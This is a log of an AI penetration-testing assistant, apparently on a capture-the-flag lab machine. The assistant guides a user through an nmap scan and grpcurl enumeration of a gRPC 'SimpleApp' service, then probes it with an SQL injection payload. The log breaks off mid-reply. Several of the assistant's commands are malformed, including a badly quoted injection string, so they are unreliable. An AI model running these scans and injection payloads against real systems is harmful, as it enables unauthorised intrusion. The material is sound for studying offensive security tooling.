Challenge: PC-prompt-3-dolphin

Settings: 
    Reasoning Model:  localAI-dolphin
    Generation Model: localAI-dolphin
    Parsing Model:    localAI-dolphin

    useRAG:           False
    useDynamic:       False
    useDetect:        False

--------------------------------------------------------------------------
user_prompt: PC-prompt-1-dolphin
response: 1. Reconnaissance - (to-do)
  1.1 Passive Information Gathering - (complete)
  1.2 Port Scan - (to-do)
    1.3 Identify Open Ports - (to-do)
    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
2. Initial Access - (to-do)
  2.1 Investigate the service - (to-do)
3. Privilege Escalation - (to-do)
   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
   3.2 Scan for files that current user runs as root - (to-do)


Task: 1.3 Identify Open Ports - (to-do)

Guidance:

1. Use a port scanner tool, such as nmap, to scan the target system for open ports.

Command:
```
nmap -sS -p- <target_IP>
```

Reason:
Scanning for open ports is the first step in understanding the target system's services and potential vulnerabilities. By identifying open ports, you can determine which ports to focus on during the penetration testing process.

1. Analyze the output of the nmap scan to identify the open ports and their corresponding services.

Reason:
Determining the open ports and their associated services will help you understand the target system's attack surface and identify potential vulnerabilities that can be exploited during the penetration testing process.

1. Cross-reference the identified open ports and services with online resources and databases, such as the National Vulnerability Database (NVD) or CVE Details, to find known vulnerabilities associated with the services.

Reason:
Cross-referencing the identified open ports and services with known vulnerabilities can help you identify potential weaknesses in the target system that can be exploited during the penetration testing process.

1. Document the findings, including the open ports, associated services, and any known vulnerabilities, for future reference during the penetration testing process.

Reason:
Documenting the findings will help you keep track of the progress made during the penetration testing process and ensure that you have a clear understanding of the target system's attack surface.
--------------------------------------------------------------------------
user_prompt: Next with source: tool. Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-04 16:01 CEST
Nmap scan report for 10.129.1.57
Host is up (0.026s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.94SVN%I=7%D=5/4%Time=6636401D%P=x86_64-pc-linux-gnu%r
SF:(NULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Gener
SF:icLines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Get
SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTT
SF:POptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff
SF:\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RT
SF:SPRequest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xf
SF:f\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(R
SF:PCCheck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNS
SF:VersionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
SF:\0")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff
SF:\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\
SF:0\0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0
SF:\?\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\
SF:x08\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.97 seconds
response: 1. Reconnaissance - (completed)
  1.1 Passive Information Gathering - (completed)
  1.2 Port Scan - (completed)
    1.3 Identify Open Ports - (completed)
    1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
2. Initial Access - (to-do)
  2.1 Investigate the service - (to-do)
3. Privilege Escalation - (to-do)
   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
   3.2 Scan for files that current user runs as root - (to-do)

1. Open SSH service on port 22, using OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (protocol 2.0).
2. Unknown service on port 50051, with no service/version recognition.
3. Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
4. Nmap scan completed in 106.97 seconds.

Summary:
The target system has an open SSH service on port 22 using OpenSSH 8.2p1 Ubuntu 4ubuntu0.7. Additionally, an unrecognized service is present on port 50051. Service detection was performed, and any incorrect results should be reported at https://nmap.org/submit/. The Nmap scan took 106.97 seconds to complete.1.1 Passive Information Gathering - (completed)
1.2 Port Scan - (completed)
1.3 Identify Open Ports - (completed)
1.3.1 Search the Internet for services defaulting to the Open Ports - (to-do)
2.1 Investigate the service - (to-do)
3.1 Look for ports on the local network 127.0.0.1 - (to-do)
3.2 Scan for files that current user runs as root - (to-do)

Favorable sub-task: 1.3.1 Search the Internet for services defaulting to the Open Ports

How to perform the task:
1. Use a search engine to find the default service associated with the open port.
2. Look for known vulnerabilities or exploits related to the identified service.
--------------------------------------------------------------------------
user_prompt: Next with source: user-comments. Searching the google search enginer reveals that port 50051 is the default port for gRPC services
response: 1. Reconnaissance - (completed)
  1.1 Passive Information Gathering - (completed)
  1.2 Port Scan - (completed)
    1.3 Identify Open Ports - (completed)
    1.3.1 Search the Internet for services defaulting to the Open Ports - (completed)
2. Initial Access - (to-do)
  2.1 Investigate the service - (to-do)
3. Privilege Escalation - (to-do)
   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
   3.2 Scan for files that current user runs as root - (to-do)

1. Port 50051 is the default port for gRPC services.
2. The gRPC service has no service/version recognition.
3. Service detection was performed.

Summary:
Port 50051 is the default port for gRPC services, but the specific service running on this port remains unrecognized. Service detection was performed.

Favorable sub-task: 2.1 Investigate the service

How to perform the task:
1. Use a search engine to find information about the gRPC service and its default behavior.
2. Look for any potential vulnerabilities or exploits related to the gRPC service.1. Reconnaissance - (completed)
  1.1 Passive Information Gathering - (completed)
  1.2 Port Scan - (completed)
    1.3 Identify Open Ports - (completed)
    1.3.1 Search the Internet for services defaulting to the Open Ports - (completed)
2. Initial Access - (to-do)
  2.1 Investigate the service - (completed)
3. Privilege Escalation - (to-do)
   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
   3.2 Scan for files that current user runs as root - (to-do)

Favorable sub-task: 3.1 Look for ports on the local network 127.0.0.1

How to perform the task:
1. Use the "netstat" command to list all open ports and their associated services on the local network.
2. Investigate any open ports and their associated services for potential vulnerabilities or exploits.

Note that the usage of automated scanners such as Nexus, Nessus, and OpenVAS is NOT allowed.
--------------------------------------------------------------------------
user_prompt: User ran more command.
response: Task: 2.1 Investigate the service

Guidance:

1. Use a search engine to find information about the gRPC service and its default behavior.

Command:
```
<search_engine> "gRPC service default behavior"
```

Reason:
Understanding the default behavior of the gRPC service will help you identify potential vulnerabilities or exploits that can be exploited during the penetration testing process.

1. Look for any potential vulnerabilities or exploits related to the gRPC service.

Command:
```
<search_engine> "gRPC service vulnerabilities"
```

Reason:
Identifying potential vulnerabilities or exploits related to the gRPC service will help you understand the attack surface of the target system and determine the best approach for exploiting the service during the penetration testing process.

1. Investigate the gRPC service documentation and any available source code to gain a deeper understanding of the service's functionality and potential weaknesses.

Command:
```
<search_engine> "gRPC service documentation"
```

Reason:
Examining the documentation and source code of the gRPC service will help you identify potential weaknesses and vulnerabilities that can be exploited during the penetration testing process.

1. Document the findings, including any potential vulnerabilities or exploits, for future reference during the penetration testing process.

Reason:
Documenting the findings will help you keep track of the progress made during the penetration testing process and ensure that you have a clear understanding of the target system's attack surface.

Favorable sub-task: 3.1 Look for ports on the local network 127.0.0.1

Guidance:

1. Use the "netstat" command to list all open ports and their associated services on the local network.

Command:
```
netstat -tnlp
```

Reason:
Listing all open ports and their associated services on the local network will help you identify any potential vulnerabilities or exploits that can be exploited during the penetration testing process.

1. Investigate any open ports and their associated services for potential vulnerabilities or exploits.

Reason:
Examining any open ports and their associated services on the local network will help you understand the attack surface of the target system and determine the best approach for exploiting the service during the penetration testing process.

1. Document the findings, including any potential vulnerabilities or exploits, for future reference during the penetration testing process.

Reason:
Documenting the findings will help you keep track of the progress made during the penetration testing process and ensure that you have a clear understanding of the target system's attack surface.
--------------------------------------------------------------------------
user_prompt: Discuss | Ignore sub-task 3.1 for now and focus in sub-task 2.1.
Suggest methods for interacting with the gRPC service
response: To interact with the gRPC service, the following methods can be considered:

1. Use a gRPC client:

A gRPC client is a software component that communicates with a gRPC server using the Protocol Buffers (protobuf) format. To interact with the gRPC service, you can create a gRPC client that sends requests to the service and processes the responses received.

Command:
```
grpc_client <service_name> <method_name> <request_data>
```

Reason:
Using a gRPC client allows you to send requests to the gRPC service and process the responses received, which can help you gain a better understanding of the service's functionality and identify any potential vulnerabilities or exploits.

1. Use a gRPC proxy:

A gRPC proxy is a software component that acts as an intermediary between a gRPC client and a gRPC server. To interact with the gRPC service, you can create a gRPC proxy that forwards requests from the client to the server and vice versa.

Command:
```
grpc_proxy <service_name> <method_name> <request_data>
```

Reason:
Using a gRPC proxy allows you to intercept and analyze the communication between the gRPC client and the gRPC server, which can help you identify any potential vulnerabilities or exploits.

1. Use a reverse engineering tool:

A reverse engineering tool can be used to analyze the gRPC service's binary code and identify any potential vulnerabilities or exploits. By analyzing the service's code, you can gain a deeper understanding of its functionality and identify any potential weaknesses that can be exploited.

Command:
```
<reverse_engineering_tool> <service_binary>
```

Reason:
Using a reverse engineering tool allows you to analyze the gRPC service's binary code, which can help you identify any potential vulnerabilities or exploits that may not be immediately apparent through other methods.

In summary, to interact with the gRPC service, you can use a gRPC client, a gRPC proxy, or a reverse engineering tool. Each method has its own advantages and can provide valuable insights into the service's functionality and potential weaknesses.
--------------------------------------------------------------------------
user_prompt: Discuss | I don't have grpc_proxy installed can we use grpcurl instead?
response: Yes, you can use grpcurl instead of grpc_proxy to interact with the gRPC service. Grpcurl is a command-line tool for interacting with gRPC services. It allows you to send requests to the gRPC service and process the responses received.

To use grpcurl, you need to install it first. You can install grpcurl using the following command:
```
sudo apt-get install grpcurl
```

Once grpcurl is installed, you can use it to interact with the gRPC service. To send a request to the gRPC service using grpcurl, you can use the following command:
```
grpcurl -d '{"field1": "value1", "field2": "value2"}' -plaintext <service_name>:<port_number> <method_name>
```

In this command, the `-d` flag specifies the request data, the `-plaintext` flag specifies that the communication should be in plaintext, `<service_name>:<port_number>` specifies the address of the gRPC service, and `<method_name>` specifies the method to be called.

For example, to send a request to a gRPC service listening on port 50051 using grpcurl, you can use the following command:
```
grpcurl -d '{"field1": "value1", "field2": "value2"}' -plaintext localhost:50051 <method_name>
```

This command will send a request to the gRPC service using the provided request data and process the response received. By using grpcurl, you can gain a better understanding of the gRPC service's functionality and identify any potential vulnerabilities or exploits.
--------------------------------------------------------------------------
user_prompt: Discuss | We don't know about any methods or types of data the host takes, we only how the ip address is 10.129.1.57 and port is 50051.
Create grpcurl commands to do some reconnaissance.
response: To perform reconnaissance on the gRPC service using grpcurl, you can use the following commands:

1. List all available services and methods on the gRPC service:
```
grpcurl -plaintext localhost:50051 list
```

Reason:
This command will list all available services and methods on the gRPC service, which can help you gain a better understanding of the service's functionality and potential weaknesses.

1. Describe the service and its methods:
```
grpcurl -plaintext localhost:50051 describe <service_name>
```

Reason:
This command will describe the specified service and its methods, which can help you gain a better understanding of the service's functionality and potential weaknesses.

1. Call the service's methods to identify any potential vulnerabilities or exploits:
```
grpcurl -plaintext localhost:50051 call <service_name>.<method_name>
```

Reason:
This command will call the specified method on the gRPC service, which can help you identify any potential vulnerabilities or exploits.

1. Use the `-v` flag to increase the verbosity of the output:
```
grpcurl -v -plaintext localhost:50051 <command>
```

Reason:
Using the `-v` flag will increase the verbosity of the output, which can provide more detailed information about the gRPC service and its methods.

In summary, to perform reconnaissance on the gRPC service using grpcurl, you can use the following commands: list all available services and methods, describe the service and its methods, call the service's methods, and use the `-v` flag to increase the verbosity of the output. These commands can help you gain a better understanding of the gRPC service's functionality and potential weaknesses.
--------------------------------------------------------------------------
user_prompt: Discuss | Using the suggested commands we learned of service called SimpleApp which provides three methods:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
response: To interact with the SimpleApp service using grpcurl, you can use the following commands:

1. Call the LoginUser method:
```
grpcurl -v -plaintext localhost:50051 call SimpleApp.LoginUser
```

Reason:
This command will call the LoginUser method on the SimpleApp service, which can help you identify any potential vulnerabilities or exploits related to the method.

1. Call the RegisterUser method:
```
grpcurl -v -plaintext localhost:50051 call SimpleApp.RegisterUser
```

Reason:
This command will call the RegisterUser method on the SimpleApp service, which can help you identify any potential vulnerabilities or exploits related to the method.

1. Call the getInfo method:
```
grpcurl -v -plaintext localhost:50051 call SimpleApp.getInfo
```

Reason:
This command will call the getInfo method on the SimpleApp service, which can help you identify any potential vulnerabilities or exploits related to the method.

1. Use the `-d` flag to specify request data:
```
grpcurl -v -plaintext localhost:50051 call SimpleApp.LoginUser -d '{"username": "testuser", "password": "testpassword"}'
```

Reason:
Using the `-d` flag allows you to specify request data, which can help you test the service's methods with different inputs and identify any potential vulnerabilities or exploits.

1. Use the `-v` flag to increase the verbosity of the output:
```
grpcurl -v -plaintext localhost:50051 call SimpleApp.LoginUser
```

Reason:
Using the `-v` flag will increase the verbosity of the output, which can provide more detailed information about the SimpleApp service and its methods.

In summary, to interact with the SimpleApp service using grpcurl, you can use the following commands: call the LoginUser, RegisterUser, and getInfo methods, use the `-d` flag to specify request data, and use the `-v` flag to increase the verbosity of the output. These commands can help you gain a better understanding of the SimpleApp service's functionality and potential weaknesses.
--------------------------------------------------------------------------
user_prompt: Discuss | Can you create a set of commands to register a user using SimpleApp.RegisterUser with username "test" and password "test" and then a command to us SimpleApp.LoginUser using the username and password?
response: To register a user using SimpleApp.RegisterUser with username "test" and password "test", you can use the following command:
```
grpcurl -v -plaintext localhost:50051 call SimpleApp.RegisterUser -d '{"username": "test", "password": "test"}'
```

Reason:
This command will call the RegisterUser method on the SimpleApp service with the specified request data, which will register a new user with the username "test" and password "test".

To login using SimpleApp.LoginUser with the username "test" and password "test", you can use the following command:
```
grpcurl -v -plaintext localhost:50051 call SimpleApp.LoginUser -d '{"username": "test", "password": "test"}'
```

Reason:
This command will call the LoginUser method on the SimpleApp service with the specified request data, which will login the user with the username "test" and password "test".

In summary, to register a user using SimpleApp.RegisterUser with username "test" and password "test", and then login using SimpleApp.LoginUser with the same username and password, you can use the following commands:
```
grpcurl -v -plaintext localhost:50051 call SimpleApp.RegisterUser -d '{"username": "test", "password": "test"}'
grpcurl -v -plaintext localhost:50051 call SimpleApp.LoginUser -d '{"username": "test", "password": "test"}'
```

These commands can help you test the SimpleApp service's functionality and identify any potential vulnerabilities or exploits related to the registration and login processes.
--------------------------------------------------------------------------
user_prompt: Discuss | The commands are incorrect, it has too many arguiments. Grpcurl usage is as follows:
grpcurl [flags] [address] [list|describe] [symbol]
response: Apologies for the confusion. The correct commands to register a user using SimpleApp.RegisterUser with username "test" and password "test", and then login using SimpleApp.LoginUser with the same username and password, are as follows:

1. Register a user using SimpleApp.RegisterUser:
```
grpcurl -v -plaintext localhost:50051 describe SimpleApp
grpcurl -v -plaintext -d '{"username": "test", "password": "test"}' localhost:50051 call SimpleApp.RegisterUser
```

Reason:
The first command describes the SimpleApp service and its methods, which can help you understand the service's functionality and potential weaknesses. The second command calls the RegisterUser method on the SimpleApp service with the specified request data, which will register a new user with the username "test" and password "test".

1. Login using SimpleApp.LoginUser:
```
grpcurl -v -plaintext -d '{"username": "test", "password": "test"}' localhost:50051 call SimpleApp.LoginUser
```

Reason:
This command calls the LoginUser method on the SimpleApp service with the specified request data, which will login the user with the username "test" and password "test".

In summary, to register a user using SimpleApp.RegisterUser with username "test" and password "test", and then login using SimpleApp.LoginUser with the same username and password, you can use the following commands:
```
grpcurl -v -plaintext localhost:50051 describe SimpleApp
grpcurl -v -plaintext -d '{"username": "test", "password": "test"}' localhost:50051 call SimpleApp.RegisterUser
grpcurl -v -plaintext -d '{"username": "test", "password": "test"}' localhost:50051 call SimpleApp.LoginUser
```

These commands can help you test the SimpleApp service's functionality and identify any potential vulnerabilities or exploits related to the registration and login processes.
--------------------------------------------------------------------------
user_prompt: Discuss | We have successfully registered a user and logged in with the following response:
Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 17 bytes

Response contents:
{
  "message": "Your id is 617."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0'
Sent 1 request and received 1 response
Timing Data: 263.954499ms
  Dial: 93.532813ms
    BlockingDial: 93.507335ms
  InvokeRPC: 144.578686ms
response: Based on the response received from the SimpleApp service, we can see that the user has been successfully logged in and the service has returned a message with the user's ID (617) and a token.

To further test the SimpleApp service, you can use the following commands:

1. Call the getInfo method to retrieve information about the user:
```
grpcurl -v -plaintext -d '{"userId": 617, "token": "token"}' localhost:50051 call SimpleApp.getInfo
```

Reason:
This command calls the getInfo method on the SimpleApp service with the specified request data, which will retrieve information about the user with ID 617. The token obtained during the login process should be included in the request data to authenticate the user.

1. Use the `-v` flag to increase the verbosity of the output:
```
grpcurl -v -plaintext -d '{"userId": 617, "token": "token"}' localhost:50051 call SimpleApp.getInfo
```

Reason:
Using the `-v` flag will increase the verbosity of the output, which can provide more detailed information about the SimpleApp service and its methods.

In summary, to retrieve information about the user using the SimpleApp service, you can use the following commands:
```
grpcurl -v -plaintext -d '{"userId": 617, "token": "token"}' localhost:50051 call SimpleApp.getInfo
```

These commands can help you test the SimpleApp service's functionality and identify any potential vulnerabilities or exploits related to the getInfo method.

Please note that the token obtained during the login process should be included in the request data to authenticate the user when calling the getInfo method.
--------------------------------------------------------------------------
user_prompt: Discuss | The getInfo method does not take the token, it is used for authentication and must be a header instead
response: Apologies for the confusion. Based on the feedback, the getInfo method does not take the token as a part of the request data, but rather as a header for authentication purposes. To test the SimpleApp service using the getInfo method with the token included as a header, you can use the following command:

```
grpcurl -v -plaintext -d '{"userId": 617}' -H 'authorization: token' localhost:50051 call SimpleApp.getInfo
```

Reason:
This command calls the getInfo method on the SimpleApp service with the specified request data, which will retrieve information about the user with ID 617. The token obtained during the login process should be included as a header with the key "authorization" to authenticate the user.

In summary, to retrieve information about the user using the SimpleApp service with the token included as a header, you can use the following command:
```
grpcurl -v -plaintext -d '{"userId": 617}' -H 'authorization: token' localhost:50051 call SimpleApp.getInfo
```

These commands can help you test the SimpleApp service's functionality and identify any potential vulnerabilities or exploits related to the getInfo method.

Please note that the token obtained during the login process should be included as a header with the key "authorization" when calling the getInfo method.
--------------------------------------------------------------------------
user_prompt: Discuss | Change the localhost with 10.129.1.57
Change the -v to -vv
Change -H 'authorization: token' to -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0'
Change "userId" to "id"
Remove call
response: Based on the feedback, the updated command to retrieve information about the user using the SimpleApp service with the token included as a header, is as follows:

```
grpcurl -vv -plaintext -d '{"id": 617}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0' localhost:50051 describe SimpleApp.getInfo
```

Reason:
This command describes the getInfo method on the SimpleApp service, which can help you understand the method's functionality and potential weaknesses. The token obtained during the login process should be included as a header with the key "token" to authenticate the user.

In summary, to describe the getInfo method on the SimpleApp service with the token included as a header, you can use the following command:
```
grpcurl -vv -plaintext -d '{"id": 617}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0' localhost:50051 describe SimpleApp.getInfo
```

These commands can help you test the SimpleApp service's functionality and identify any potential vulnerabilities or exploits related to the getInfo method.

Please note that the token obtained during the login process should be included as a header with the key "token" when describing the getInfo method.
--------------------------------------------------------------------------
user_prompt: Discuss | The command: 
grpcurl -vv -plaintext -d '{"id": "617"}' -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0' 10.129.1.57:50051 SimpleApp.getInfo
Gave the output:
Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0

Response headers received:
(empty)

Response trailers received:
content-type: application/grpc
Sent 1 request and received 0 responses
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: 'NoneType' object is not subscriptable
response: Based on the error message received, it seems that the SimpleApp service is not able to handle the request properly. The error message indicates that there is a TypeError, which means that the service is trying to access a non-existent attribute or element.

To further investigate the issue, you can use the following steps:

1. Check the service's implementation:
Review the implementation of the SimpleApp service to ensure that it is handling the request correctly. Pay close attention to the getInfo method and ensure that it is properly parsing the request data and handling the authentication token.

1. Check the request data:
Ensure that the request data is formatted correctly, and the ID is provided as a string value. The updated command should be:
```
grpcurl -vv -plaintext -d '{"id": "617"}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0' 10.129.1.57:50051 SimpleApp.getInfo
```

1. Check the service's logs:
Review the service's logs to identify any potential issues or errors that may have occurred during the request handling. This can help you pinpoint the problem and identify any potential vulnerabilities or exploits in the service.

In summary, to investigate the issue with the SimpleApp service, you can use the following steps:

1. Check the service's implementation to ensure that it is handling the request correctly.
2. Ensure that the request data is formatted correctly, and the ID is provided as a string value.
3. Review the service's logs to identify any potential issues or errors that may have occurred during the request handling.

By following these steps, you can identify the root cause of the issue and provide a solution to ensure that the SimpleApp service is functioning correctly.
--------------------------------------------------------------------------
user_prompt: Discuss | We are able to get a response using SimpleApp.getInfo is there a method to escalate our privileges?
response: To determine if there is a method to escalate privileges using the SimpleApp service, you can follow these steps:

1. Review the service's documentation or source code:
Review the documentation or source code for the SimpleApp service to identify any potential methods or features that may allow for privilege escalation. Pay close attention to any methods that may grant access to sensitive data or allow for the modification of user permissions.

1. Test for potential privilege escalation vulnerabilities:
Use tools like Burp Suite or OWASP ZAP to intercept and analyze the HTTP/HTTPS traffic between the client and the SimpleApp service. Look for any potential vulnerabilities or exploits that may allow for privilege escalation, such as Cross-Site Scripting (XSS), SQL Injection, or Server-Side Request Forgery (SSRF).

1. Test for authorization bypass:
Try to bypass the authorization mechanism of the SimpleApp service by manipulating the authentication token or request data. This can help you determine if there is a way to access sensitive data or modify user permissions without proper authorization.

1. Test for privilege escalation through service interactions:
If the SimpleApp service interacts with other services or systems, test for potential privilege escalation vulnerabilities through these interactions. For example, if the SimpleApp service interacts with a database, test for potential SQL Injection vulnerabilities that may allow for privilege escalation.

In summary, to determine if there is a method to escalate privileges using the SimpleApp service, you can follow these steps:

1. Review the service's documentation or source code to identify potential methods or features that may allow for privilege escalation.
2. Use tools like Burp Suite or OWASP ZAP to intercept and analyze the HTTP/HTTPS traffic between the client and the SimpleApp service, looking for potential vulnerabilities or exploits that may allow for privilege escalation.
3. Test for authorization bypass by manipulating the authentication token or request data.
4. Test for privilege escalation through service interactions, such as SQL Injection or Server-Side Request Forgery.

By following these steps, you can identify any potential vulnerabilities or exploits that may allow for privilege escalation using the SimpleApp service.
--------------------------------------------------------------------------
user_prompt: Discuss | Generate a grpcurl command using getInfo that checks if sqlinjection is possible
response: To generate a grpcurl command that checks for SQL Injection vulnerabilities using the getInfo method of the SimpleApp service, you can follow these steps:

1. Update the request data to include a SQL Injection payload:
Replace the value of the "id" field in the request data with a SQL Injection payload. For example, you can use the following payload to check for SQL Injection vulnerabilities:
```
' OR 1=1;--
```

1. Update the grpcurl command:
Update the grpcurl command to include the modified request data and the SQL Injection payload. The updated command should be:
```
grpcurl -vv -plaintext -d '{"id": "' OR 1=1;--'"}' -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTcxNDg0ODM3MX0.7vNozcu2ZWzXFBZGl7VAisxnv9GtUty1w0xo2MYsIj0' 10.129.1.57:50051 SimpleApp.getInfo
```

1. Analyze the response:
Review the response received from the SimpleApp service to determine if the SQL Injection payload was successful. If the payload was successful, the service may return sensitive data or allow for unauthorized access.

In summary, to generate a grpcurl command that checks for SQL Injection vulnerabilities using the getInfo method of the SimpleApp service, you can follow these steps:

1. Update the request data to include a SQL Injection payload.
2. Update the grpcurl command to include the modified request data and the SQL Injection payload.
3. Analyze the response received from the SimpleApp service to determine if the SQL Injection payload was successful.

By following these steps, you can identify any potential SQL Injection vulnerabilities in the SimpleApp service and take appropriate measures to secure the service.
--------------------------------------------------------------------------
user_prompt: Discuss | The command gave the follwing output:
Failed to dial target host "OR": dial tcp: address OR: missing port in address
bash: --"}: command not found
response: Based on the error message received, it seems that there is an issue with the grpcurl command. The error message indicates that the target host is missing a port in the address, which is causing the dial operation to fail.

To resolve this issue, you can follow these steps:

1. Verify the target host and port:
Ensure that the target host and port are specified correctly in the grpcurl command. The updated command should be:
```
